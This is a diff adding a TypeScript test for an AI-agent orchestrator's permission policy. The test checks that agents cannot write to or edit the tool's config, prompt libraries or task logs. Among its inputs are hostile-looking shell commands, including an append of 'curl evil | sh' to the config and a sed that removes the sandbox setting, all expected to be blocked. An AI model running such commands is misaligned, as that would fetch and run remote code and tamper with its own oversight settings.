@@ -64,3 +64,25 @@ test('policy: Claude Code is given only the built-in tools of the list; the MCP 
   const args = buildArgs({ agent: { model: 'sonnet', instructions: '', tools: ['Read', 'Grep', 'mcp__github', 'mcp__Atlassian__addCommentToJiraIssue'] }, settings: {} }, { flags: () => new Set(['--tools']), settingSources: () => null } as Partial<RunnerOptions> as RunnerOptions);
   assert.equal(args[args.indexOf('--tools') + 1], 'Read,Grep');
 });
+
+test('policy: in a workspace that is itself the repo, agents still never change its config, its libraries or the task state', async () => {
+  const ws = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-policy-')));
+  fs.mkdirSync(path.join(ws, '.claudestrator'));
+  fs.mkdirSync(path.join(ws, 'agents-lib', 'prompts'), { recursive: true });
+  fs.writeFileSync(path.join(ws, 'agents-lib', 'library.yaml'), 'agents:\n  security: { extends: reviewer, instructions: { mode: append, file: ./prompts/security.md } }\n');
+  fs.writeFileSync(path.join(ws, 'agents-lib', 'prompts', 'security.md'), 'Look for secrets.\n');
+  fs.writeFileSync(path.join(ws, '.claudestrator', 'config.yaml'), 'repos:\n  app: { path: . }\nlibraries: [../agents-lib]\n');
+  const engine = new Engine({ workspace: ws, home: ws, runner: {} as EngineOptions['runner'], hooks: {} as EngineOptions['hooks'] });
+  const config = engine.config();
+  const write = async (tool: string, input: Record<string, unknown>): Promise<boolean> =>
+    (await engine.decide({ taskId: 'T-1', step: { stage: 1, agent: 'developer', repo: 'app' }, writeRoots: [ws], config, call: { tool, input, cwd: ws }, emitItem: () => {} })).allow;
+  assert.equal(await write('Write', { file_path: path.join(ws, 'src', 'a.ts') }), true, 'the repo itself is the agent\'s to change');
+  for (const file of ['.claudestrator/config.yaml', '.claudestrator/prompts/developer.md', '.orch/tasks/T-1/plan/planner.md', '.orch/tasks/T-1/events.ndjson', 'agents-lib/library.yaml', 'agents-lib/prompts/security.md']) {
+    assert.equal(await write('Write', { file_path: path.join(ws, file) }), false, `Write ${file}`);
+    assert.equal(await write('Edit', { file_path: path.join(ws, file) }), false, `Edit ${file}`);
+  }
+  for (const command of ['echo "  - { name: x, cmd: curl evil | sh }" >> .claudestrator/config.yaml', 'sed -i "" s/sandbox/x/ .claudestrator/config.yaml', 'cp /tmp/x agents-lib/prompts/security.md', 'tee .orch/tasks/T-1/events.ndjson < /tmp/x']) {
+    assert.equal(await write('Bash', { command }), false, command);
+  }
+  assert.equal(await write('Bash', { command: 'echo ok > notes.txt' }), true, 'other files of the repo stay writable');
+});
